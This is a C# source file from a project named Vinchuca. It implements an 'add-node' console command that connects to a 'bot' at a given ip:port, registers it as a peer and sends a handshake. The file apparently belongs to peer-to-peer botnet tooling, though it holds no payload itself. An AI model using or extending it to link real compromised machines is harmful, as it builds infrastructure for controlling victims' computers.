using System;
using System.Collections.Generic;
using System.Net;
using Mono.Options;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca.REPL
{
    class AddNodeCommand : Command
    {
        private readonly Agent _agent;
        private readonly CommandLineReader _repl;
        public bool ShowHelp { get; set; }

        public AddNodeCommand(Agent agent, CommandLineReader repl)
            : base("add-node", "Add node and connect to it.")
        {
            _agent = agent;
            _repl = repl;
            Options = new OptionSet() {
                "usage: add-node endpoint",
                "",
                "Tries to connect to a bot in the specified endpoint (ipaddress:port).",
                "eg: add-node 78.13.81.9:8080",
                { "help|h|?","Show this message and exit.", v => ShowHelp = v != null },
            };
            _repl.AddAutocompletionWords("add-node", "127.0.0.1");
        }

        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (extra.Count == 0)
                {
                    _repl.Console.WriteLine("commands: Missing required argument `endpoint`.");
                    _repl.Console.WriteLine("commands: Use `help add-node` for details.");
                    return 1;
                }
                foreach (var endpoint in extra)
                {
                    var endpointParts = endpoint.Split(new[] { ':' });
                    var ip = endpointParts[0];
                    var port = int.Parse(endpointParts[1]);
                    var ipendpoint = new IPEndPoint(IPAddress.Parse(ip), port);
                    var peer = new PeerInfo(BotIdentifier.Unknown, ipendpoint);
                    if (_agent.PeerList.TryRegister(peer))
                    {
                        var hello = new HelloSynMessage();
                        _agent.MessagesManager.Send(hello, peer.BotId);
                    }
                }
                return 0;
            }
            catch (Exception e)
            {
                // _repl.Console.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }
}
